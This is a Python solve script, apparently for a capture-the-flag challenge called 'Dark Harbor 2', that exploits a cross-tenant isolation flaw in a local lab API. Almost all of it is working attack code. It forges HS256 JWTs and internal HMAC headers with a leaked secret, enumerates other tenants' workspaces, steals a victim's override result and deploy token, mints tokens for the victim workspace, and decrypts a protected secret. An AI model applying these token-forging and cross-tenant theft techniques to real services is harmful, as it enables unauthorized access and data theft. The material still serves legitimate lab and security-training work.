#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import os
import subprocess
import sys
import time
from pathlib import Path
from urllib import error, request

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


ROOT = Path(__file__).resolve().parent
DEFAULT_TARGET = "http://127.0.0.1:8080"
DEFAULT_POLICY_CONTAINER = "dark_harbor_2-policy-engine-1"
INTERNAL_OVERRIDE_PATH = "/internal/admin/policy-override"


def load_env(path: Path) -> dict:
    env = {}
    if not path.exists():
        return env
    for raw_line in path.read_text().splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        env[key] = value
    return env


def parse_response(raw: bytes):
    if not raw:
        return {}
    try:
        return json.loads(raw)
    except Exception:
        return {"raw": raw.decode(errors="replace")}


def http_json(method: str, url: str, data=None, headers=None, timeout: int = 10):
    body = None
    request_headers = {}
    if isinstance(data, (dict, list)):
        body = json.dumps(data, separators=(",", ":")).encode()
        request_headers["Content-Type"] = "application/json"
    elif isinstance(data, str):
        body = data.encode()
    elif isinstance(data, bytes):
        body = data
    if headers:
        request_headers.update(headers)
    req = request.Request(url, data=body, headers=request_headers, method=method)
    try:
        with request.urlopen(req, timeout=timeout) as resp:
            return resp.status, parse_response(resp.read()), dict(resp.headers)
    except error.HTTPError as exc:
        return exc.code, parse_response(exc.read()), dict(exc.headers)


def b64u(data) -> bytes:
    if isinstance(data, (dict, list)):
        data = json.dumps(data, separators=(",", ":")).encode()
    elif isinstance(data, str):
        data = data.encode()
    elif not isinstance(data, bytes):
        raise TypeError(f"unsupported type for b64u: {type(data)!r}")
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def make_hs256_jwt(payload: dict, key: str, header=None) -> str:
    jwt_header = {"alg": "HS256", "typ": "JWT"}
    if header:
        jwt_header.update(header)
    signing_input = b64u(jwt_header) + b"." + b64u(payload)
    signature = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64u(signature)).decode()


def generate_internal_hmac(method: str, path: str, body: bytes, secret: str, timestamp: int | None = None) -> str:
    if timestamp is None:
        timestamp = int(time.time())
    body_hash = hashlib.sha256(body).hexdigest()
    message = f"{method.upper()}\n{path}\n{timestamp}\n{body_hash}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()
    return f"SHA256:{timestamp}:{signature}"


def derive_key(signing_key: str, session_seal: str) -> bytes:
    return hmac.new(signing_key.encode(), session_seal.encode(), hashlib.sha256).digest()[:32]


def decrypt_flag(ciphertext_b64: str, signing_key: str, session_seal: str) -> str:
    blob = base64.b64decode(ciphertext_b64)
    nonce = blob[:12]
    ciphertext = blob[12:]
    key = derive_key(signing_key, session_seal)
    return AESGCM(key).decrypt(nonce, ciphertext, None).decode()


def docker_container_ip(name: str) -> str:
    proc = subprocess.run(
        ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}", name],
        check=True,
        capture_output=True,
        text=True,
    )
    values = proc.stdout.strip().split()
    if not values:
        raise RuntimeError(f"failed to discover container IP for {name}")
    return values[0]


def phase1_handoff(base_url: str, hmac_secret: str):
    status, body, _ = http_json("POST", f"{base_url}/api/phase1-handoff", {"hmac_secret": hmac_secret})
    if status != 200:
        raise RuntimeError(f"phase1 handoff failed: {status} {body}")
    return body


def list_workspaces(base_url: str, admin_jwt: str):
    status, body, _ = http_json("GET", f"{base_url}/api/workspaces?page=1&limit=100", headers={"Authorization": f"Bearer {admin_jwt}"})
    if status != 200:
        raise RuntimeError(f"workspace enumeration failed: {status} {body}")
    return body


def override_result(base_url: str, admin_jwt: str, workspace_id: int):
    status, body, _ = http_json("GET", f"{base_url}/api/deploy/{workspace_id}/override-result", headers={"Authorization": f"Bearer {admin_jwt}"})
    return status, body


def deploy_token(base_url: str, admin_jwt: str, workspace_id: int):
    status, body, _ = http_json(
        "POST",
        f"{base_url}/api/deploy/{workspace_id}/token",
        {},
        {"Authorization": f"Bearer {admin_jwt}"},
    )
    if status != 201:
        raise RuntimeError(f"deploy token creation failed for workspace {workspace_id}: {status} {body}")
    return body


def use_token(base_url: str, admin_jwt: str, workspace_id: int, token: str, action: str):
    status, body, _ = http_json(
        "POST",
        f"{base_url}/api/deploy/{workspace_id}/use-token",
        {"token": token, "action": action},
        {"Authorization": f"Bearer {admin_jwt}"},
    )
    if status != 200:
        raise RuntimeError(f"use-token({action}) failed for workspace {workspace_id}: {status} {body}")
    return body


def internal_override(policy_base: str, internal_jwt: str, hmac_secret: str, workspace_id: int, reason: str):
    payload = {
        "workspace_id": workspace_id,
        "reason": reason,
        "scope": "deploy",
        "target_state": "APPROVED",
    }
    body = json.dumps(payload, separators=(",", ":")).encode()
    status, resp_body, _ = http_json(
        "POST",
        f"{policy_base}{INTERNAL_OVERRIDE_PATH}",
        body,
        {
            "Authorization": f"Bearer {internal_jwt}",
            "Content-Type": "application/json",
            "X-Internal-HMAC": generate_internal_hmac("POST", INTERNAL_OVERRIDE_PATH, body, hmac_secret),
            "X-Pipeline-State": "REVIEW",
        },
    )
    if status != 200:
        raise RuntimeError(f"internal override failed for workspace {workspace_id}: {status} {resp_body}")
    return resp_body


def sorted_phase1_workspaces(workspaces: list[dict]) -> list[dict]:
    filtered = [w for w in workspaces if str(w.get("name", "")).startswith("phase2-")]
    return sorted(filtered, key=lambda item: int(item["id"]))


def find_leaked_override(base_url: str, admin_jwt: str, workspaces: list[dict], skip_workspace_ids: set[int] | None = None):
    skip_workspace_ids = skip_workspace_ids or set()
    last_error = None
    for workspace in workspaces:
        workspace_id = int(workspace["id"])
        if workspace_id in skip_workspace_ids:
            continue
        status, body = override_result(base_url, admin_jwt, workspace_id)
        if status == 200:
            return workspace, body
        last_error = (workspace_id, status, body)
    if last_error:
        workspace_id, status, body = last_error
        raise RuntimeError(f"no readable override_result found; last checked workspace {workspace_id}: {status} {body}")
    raise RuntimeError("no candidate workspaces available for override_result scanning")


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve Dark Harbor 2 via the shared handoff tenant isolation bug.")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Base URL for the edge/API server")
    parser.add_argument("--policy-url", help="Direct policy-engine URL, for example http://127.0.0.1:5000")
    parser.add_argument("--policy-container", default=DEFAULT_POLICY_CONTAINER, help="Docker container used to discover the policy-engine IP")
    parser.add_argument("--env-file", default=str(ROOT / ".env"), help="Path to the local .env file")
    parser.add_argument("--victim-reason", default="victim-preseed", help="Reason used when creating the victim override_result")
    parser.add_argument("--seed-local", action="store_true", help="For local reproduction, seed a victim override_result through the internal policy-engine path first")
    parser.add_argument("--workspace-id", type=int, help="Read override_result from a specific workspace id instead of auto-scanning")
    parser.add_argument("--transcript", action="store_true", help="Print a terminal-style log suitable for screenshots")
    args = parser.parse_args()

    env = load_env(Path(args.env_file))
    hmac_secret = env.get("HMAC_SECRET") or os.environ.get("HMAC_SECRET")
    if not hmac_secret:
        raise RuntimeError("HMAC_SECRET not found in .env or environment")

    target = args.target.rstrip("/")
    policy_url = None
    seeded_override = None
    victim_workspace_id = None

    if args.seed_local:
        policy_url = args.policy_url
        if not policy_url:
            policy_url = f"http://{docker_container_ip(args.policy_container)}:5000"
        policy_url = policy_url.rstrip("/")

        # Local reproduction mode: seed a victim workspace as if another team had
        # already reached the hidden override path.
        victim = phase1_handoff(target, hmac_secret)
        victim_workspace_id = int(victim["workspace_id"])
        now = int(time.time())
        internal_jwt = make_hs256_jwt(
            {
                "sub": "phase2-victim-seeder",
                "role": "pipeline_admin",
                "workspace": "phase2-handoff",
                "account_id": "phase1-clear",
                "iss": "darkharbor-internal",
                "iat": now,
                "exp": now + 600,
            },
            hmac_secret,
        )
        seeded_override = internal_override(policy_url, internal_jwt, hmac_secret, victim_workspace_id, args.victim_reason)

    # Attacker: independent phase1-handoff user, same shared account_id.
    attacker = phase1_handoff(target, hmac_secret)
    attacker_workspace_id = int(attacker["workspace_id"])
    attacker_jwt = attacker["admin_jwt"]

    listing = list_workspaces(target, attacker_jwt)
    shared_workspaces = sorted_phase1_workspaces(listing["workspaces"])

    if args.workspace_id is not None:
        target_workspace = next((w for w in shared_workspaces if int(w["id"]) == args.workspace_id), None)
        if target_workspace is None:
            raise RuntimeError(f"workspace {args.workspace_id} was not visible in the shared phase1-clear listing")
        status, leaked_override = override_result(target, attacker_jwt, args.workspace_id)
        if status != 200:
            raise RuntimeError(f"override-result fetch failed for workspace {args.workspace_id}: {status} {leaked_override}")
    else:
        target_workspace, leaked_override = find_leaked_override(
            target,
            attacker_jwt,
            shared_workspaces,
            skip_workspace_ids={attacker_workspace_id},
        )

    victim_workspace_id = int(target_workspace["id"])

    seal_token = deploy_token(target, attacker_jwt, victim_workspace_id)
    seal_result = use_token(target, attacker_jwt, victim_workspace_id, seal_token["token"], "seal")
    sign_result = use_token(target, attacker_jwt, victim_workspace_id, leaked_override["deploy_token"], "sign")
    flag = decrypt_flag(leaked_override["encrypted_secret"], sign_result["signing_key"], seal_result["session_seal"])

    result = {
        "target": target,
        "policy_url": policy_url,
        "victim_workspace_id": victim_workspace_id,
        "attacker_workspace_id": attacker_workspace_id,
        "shared_account_workspaces": [int(w["id"]) for w in shared_workspaces],
        "leaked_workspace": target_workspace,
        "seeded_override": seeded_override,
        "leaked_override": leaked_override,
        "seal_token": seal_token,
        "seal_result": seal_result,
        "sign_result": sign_result,
        "flag": flag,
    }

    if args.transcript:
        print(f"$ python3 solve.py --target {target}")
        print(f"[+] attacker workspace via /api/phase1-handoff: {attacker_workspace_id}")
        print(f"[+] enumerated shared phase1-clear workspaces: {', '.join(str(w['id']) for w in shared_workspaces)}")
        print(f"[+] stolen override_result from workspace {victim_workspace_id}:")
        print(json.dumps(leaked_override, indent=2))
        print(f"[+] minted fresh deploy token for victim workspace {victim_workspace_id}: {seal_token['token']}")
        print(f"[+] recovered session_seal: {seal_result['session_seal']}")
        print(f"[+] recovered signing_key from stolen override token: {sign_result['signing_key']}")
        print(f"[+] FLAG: {flag}")
    else:
        print(json.dumps(result, indent=2))

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[-] interrupted", file=sys.stderr)
        raise SystemExit(130)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
